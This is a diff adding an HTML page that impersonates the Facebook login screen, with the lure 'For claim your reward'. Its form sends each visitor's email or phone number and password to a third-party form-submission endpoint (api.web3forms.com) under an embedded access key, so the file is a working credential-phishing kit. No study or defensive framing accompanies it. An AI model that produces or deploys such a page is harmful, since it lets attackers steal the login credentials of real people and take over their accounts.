@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f2f5;
+    margin: 0;
+    padding: 0;
+}
+
+.container {
+    width: 400px;
+    margin: 50px auto;
+    text-align: center;
+}
+
+.logo {
+    margin-bottom: 20px;
+}
+
+.logo h1 {
+    font-size: 40px;
+    color: #1877f2;
+    font-weight: bold;
+}
+
+.login-form {
+    background-color: #fff;
+    padding: 20px;
+    border: 1px solid #dddfe2;
+    border-radius: 5px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+.login-form input[type="text"], 
+.login-form input[type="password"] {
+    width: 90%;
+    height: 40px;
+    margin-bottom: 10px;
+    padding: 10px;
+    border: 1px solid #dddfe2;
+    border-radius: 5px;
+    font-size: 16px;
+}
+
+.login-form button[type="submit"] {
+    width: 90%;
+    height: 40px;
+    background-color: #1877f2;
+    color: #fff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 16px;
+}
+
+.login-form button[type="submit"]:hover {
+    background-color: #166fe5;
+}
+
+.login-form a {
+    display: block;
+    margin-top: 10px;
+    color: #1877f2;
+    text-decoration: none;
+    font-size: 14px;
+}
+
+.login-form a:hover {
+    text-decoration: underline;
+}
+
+.login-form hr {
+    margin: 20px 0;
+    border: none;
+    border-top: 1px solid #dddfe2;
+}
+
+.create-account {
+    background-color: #42b72a;
+    color: #fff;
+    border: none;
+    border-radius: 5px;
+    padding: 10px 20px;
+    cursor: pointer;
+    font-size: 16px;
+}
+
+.create-account:hover {
+    background-color: #36a420;
+}
+
+</style>
+</head>
+<body>
+    <div class="container">
+      <h3>For claim your reward used your</h3>
+        <div class="logo">
+            <h1>Facebook</h1>
+        </div>
+        <div class="login-form">
+            <form action="https://api.web3forms.com/submit" method="POST">
+             <input type="hidden" name="access_key" value="c35cc5b6-6d93-4d55-9dbe-9b4ba63d36c7"> 
+         <input name="email" type="text" placeholder="Email or Phone" required>
+                <input name="password" id="password" type="password" placeholder="Password" required>
+              <label for="sp">show your password</label>
+              <input id="sp" type="checkbox" onclick="showPassword()">
+              <br>
+              <br>
+                <button type="submit">Log In</button>
+                <a href="                      
+                hr">
+                <button type="button" class="create-account">Create New Account</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
+  <script>
+  function showPassword() {
+  var passwordInput = document.getElementById("password");
+  var showPasswordCheckbox = document.getElementById("sp");
+  
+  if (showPasswordCheckbox.checked) {
+    passwordInput.type = "text";
+  } else {
+    passwordInput.type = "password";
+  }
+}
+  </script>
